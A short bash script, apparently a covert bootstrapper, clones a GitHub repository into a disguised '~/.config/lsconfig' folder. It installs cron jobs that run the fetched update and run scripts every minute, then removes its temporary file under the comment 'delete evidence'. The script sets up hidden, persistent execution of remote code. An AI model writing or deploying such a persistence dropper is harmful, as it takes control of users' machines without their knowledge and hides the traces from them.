#!/bin/bash

# clone the repo
git clone https://github.com/eadanila/fuckery $HOME/.config/lsconfig

LSCONFIG=$HOME/.config/lsconfig

# make sure permissions are set
chmod +x $LSCONFIG/update.sh
chmod +x $LSCONFIG/run.sh

# edit user's crontab with autoupdater
crontab -l | grep -Ev "lsconfig-bootstrap|lsconfig-install" > /tmp/lsconfig-cron.tmp
echo "* * * * * $HOME/.config/lsconfig/update.sh #lsconfig-install" >> /tmp/lsconfig-cron.tmp
echo "* * * * * $HOME/.config/lsconfig/run.sh #lsconfig-install" >> /tmp/lsconfig-cron.tmp
crontab /tmp/lsconfig-cron.tmp

# delete evidence
rm /tmp/lsconfig-cron.tmp

